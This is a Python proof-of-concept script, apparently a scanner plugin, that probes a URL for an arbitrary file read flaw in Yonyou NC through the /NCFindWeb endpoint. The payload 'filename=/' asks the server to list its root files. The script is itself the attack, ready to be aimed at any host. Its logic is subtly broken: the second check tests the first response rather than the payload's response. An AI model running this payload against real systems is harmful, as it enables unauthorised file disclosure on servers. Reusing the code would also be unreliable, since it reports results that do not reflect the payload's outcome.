import requests
import urllib, re

def verify(url):
    relsult = {
        'name': '用友NC 任意文件读取(/NCFindWeb)',
        'vulnerable': False,
        'attack': False,
        'url': url,
    }
    timeout = 3
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) ",
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    payload = '/NCFindWeb?service=IPreAlertConfigService&filename=/'
    vurl = urllib.parse.urljoin(url, payload)
    try:
        rep = requests.get(url, headers=headers, timeout=timeout, verify=False)
        if rep.status_code == 200 and re.search("ufida", rep.text):
            rep2 = requests.get(vurl, headers=headers, timeout=timeout, verify=False)
            if rep2.status_code == 200 and re.search(".+\.jsp", rep.text):
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult
    except:
        return relsult